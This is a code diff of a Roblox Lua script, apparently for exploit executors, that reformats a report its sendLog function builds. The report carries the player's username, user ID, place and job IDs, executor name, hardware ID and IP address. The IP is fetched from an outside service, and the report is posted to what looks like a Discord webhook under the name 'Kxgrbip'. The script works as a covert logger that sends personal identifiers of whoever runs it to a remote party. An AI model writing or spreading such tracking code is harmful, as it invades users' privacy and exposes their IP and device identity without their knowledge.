@@ -32,7 +32,6 @@ local function sendLog()
                 ["Content-Type"] = "application/json"
             }
         })
-
         if res and res.Body then
             local data = HttpService:JSONDecode(res.Body)
             if data and data.ip then
@@ -44,28 +43,46 @@ local function sendLog()
     if not success then
         warn("IP 가져오기 실패:", err)
     end
-    print("가ㅈ져온 IP:", ip)
 
     local userId = player.UserId
     local executor = (identifyexecutor and identifyexecutor()) or "unknown"
 
+    local message = string.format([[
+```
+유저명
+%s
+표시 이름
+%s
+User ID
+%s
+프로필
+https://www.roblox.com/users/%s/profile
+Place ID
+%s
+Job ID
+%s
+Executor
+%s
+HWID
+%s
+IP
+%s
+```
+]], 
+        player.Name,
+        player.DisplayName,
+        userId,
+        userId,
+        game.PlaceId,
+        game.JobId,
+        executor,
+        hwid,
+        ip
+    )
+
     local payload = {
         username = "Kxgrbip",
-        embeds = {{
-            title = "스크립트 실행 감지",
-            fields = {
-                { name = "유저명", value = player.Name, inline = true },
-                { name = "표시 이름", value = player.DisplayName, inline = true },
-                { name = "User ID", value = tostring(userId), inline = true },
-                { name = "프로필", value = "https://www.roblox.com/users/" .. userId .. "/profile" },
-                { name = "Place ID", value = tostring(game.PlaceId), inline = true },
-                { name = "Job ID", value = tostring(game.JobId), inline = true },
-                { name = "Executor", value = executor, inline = true },
-                { name = "HWID", value = hwid, inline = true },
-                { name = "IP", value = ip, inline = true },
-            },
-            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-        }},
+        content = message
     }
 
     local success2, err2 = pcall(function()
